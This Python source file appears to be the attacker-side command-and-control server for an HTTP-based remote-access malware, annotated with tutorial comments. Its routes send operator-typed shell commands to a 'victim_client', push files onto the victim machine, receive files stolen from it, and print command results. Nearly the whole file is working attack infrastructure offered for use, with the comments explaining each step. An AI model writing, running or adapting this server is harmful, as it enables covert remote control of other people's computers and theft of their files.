from http.server import BaseHTTPRequestHandler, HTTPServer

import requests, urllib, cgi, sys, mimetypes, os



port = 80

#Here we are creating a http server using python's `http.server` library, This will be used by the malware to communicate with the attacker server
#Attacker server is basically a HTTP server and malware will communicate using HTTP protocol with the `attacker_server` and send results and take commands etc

#python3 -m http.server is a module that starts up a http server in any directory and we are able to access files in that directory using http protocol
#but here this is an actual http server where we can define routes, and program each route to do specific tasks and return specific responses not just files
#This is just like node's express.js where we program APIs or HTTP Servers

#We are using this instead so that we can define functionality of each route and perform specific tasks when each route is hit like sending commands
#to malware or storing results etc

class myHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        if '/connected' in self.path:

            parsed_url = urllib.parse.urlparse(self.path)

            captured_value = urllib.parse.parse_qs(parsed_url.query)['cdir'][0]

            cmd = input(captured_value+"> ")

            self.send_response(200)

            self.send_header('Content-type','text/plain')

            self.end_headers()

            self.wfile.write(cmd.encode()) #Here we just need to send a command in http response like `ls` or `cd C:\Users\IEUser` etc.
            # So we don't need to use complicated form-urlencoded content-type that we use in HTTP requests where we convert data to key=value pair
            # urlencode the value and finally convert to bytes. As we are just sending a normal command we can use a text/plain content-type nd just directly
            #send the command. One thing which is mandatory here is to encode the data. This is mandatory for any kind of data we send using HTTP protocol
            #and it can be anything either http request or http response doesn't matter. Any data must always be encoded/converted to bytes when being sent
            #using HTTP. Binary data like binary files or bytestring can be sent directly as they are already in binary format so no need to convert them to
            #bytes
            if "exit" in cmd:

                sys.exit(0)



        if '/uploadFile' in self.path:

            parsed_url = urllib.parse.urlparse(self.path)

            filename = urllib.parse.parse_qs(parsed_url.query)['filename'][0]

            if os.path.exists(filename):

                mimetype = mimetypes.MimeTypes().guess_type(filename)[0]

                self.send_response(200)

                self.send_header('Content-type', mimetype)

                self.send_header('Content-Disposition', 'attachment;'

                        'filename=%s' % filename)

                self.end_headers()

                with open(filename, 'rb') as f:

                    self.wfile.write(f.read())

                #Here we are searching for a specific file on demand using `?file=` parameter and then sending it back as http response
                #We need no encoding as it's already binary/bytes. Secondly content-type is important. We could have used a content-type like
                #octet stream that is a general content type for all kinds of binary data. As we know files are generally in binary format
                #so we can use a general content-type like octet-stream. But here we are using a mime type detector that detects file types
                #and then we set content-type on basis of that. Like If file is an image we set content-type to `image/jpeg` or `image/png` etc based
                # on the file type. We can also use multipart-form data content-type it's also a general content-type for sending all kinds of binary data
                # but it has a proper syntax which will make it a bit complex and also it's almost never used while sending http responses it's only
                # used when we send binary data to the server using HTTP requests. Instead we can use octet stream content-type for sending binary data
                # in http response it doesn't have much overhead we can specify content-type octet-stream and send our byte stream in http response.
                # It's a general content-type for binary files so we can specify octet-stream and send any kind of binary data be it music, video, image etc

            else:
                self.send_response(404)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write("File you are trying to upload does not exist".encode())
                print("File you are trying to upload does not exist")

                #You might think why we are sending http responses unneccessarily if file is not found. The thing is
                #Our victim_client is sending http requests using requests or ie.navigate and incase of faliure or even
                #success if we don't send a proper response to it it'll keep waiting for response and then it'll timeout
                #and this will either lead to more errors or we'll never know if our malware succeeded or not. Suppose we
                #get file from victim machine and upload it here in attcker_server, In this functionality Victim sends a
                #POST request to `/storeFile` in attacker_server with file contents after saving it or even if we fail to interpret
                #or save it we have to send a proper response to it otherwise it'll keep waiting for the http response for it's POST request
                #and we'll get unneccssary exceptions, errors etc

    def do_POST(self):

        if self.path == '/storeFile':

            ctype, pdict = cgi.parse_header(self.headers.get('content-type'))

            if ctype == 'multipart/form-data':

                fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ = {"REQUEST_METHOD": "POST"})

                filename = fs.keys()[0]

                fs_up = fs[filename]

                with open(filename, "wb") as f:

                    f.write(fs_up.file.read())

                self.send_response(200)

                self.send_header('Content-type','text/plain')

                self.end_headers()

                self.wfile.write("OK".encode())

            else:

                print("File not found")

                self.send_response(200)

                self.send_header('Content-type','text/plain')

                self.end_headers()

                self.wfile.write("OK".encode())

                #Like here we just send a `OK` nothing much. We do it as it's mandatory otherwise timeout will occur


        if self.path == '/result':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            res = post_data.decode().split("=")[1]
            print(urllib.parse.unquote(res).replace("+", " "))
            self.send_response(200)
            self.send_header('Content-type','text/plain')
            self.end_headers()
            self.wfile.write("OK".encode())

            

server = HTTPServer(('', port), myHandler)
print('Started httpserver on port', port)

#Wait forever for incoming http requests

try:
    server.serve_forever()

except KeyboardInterrupt:
    pass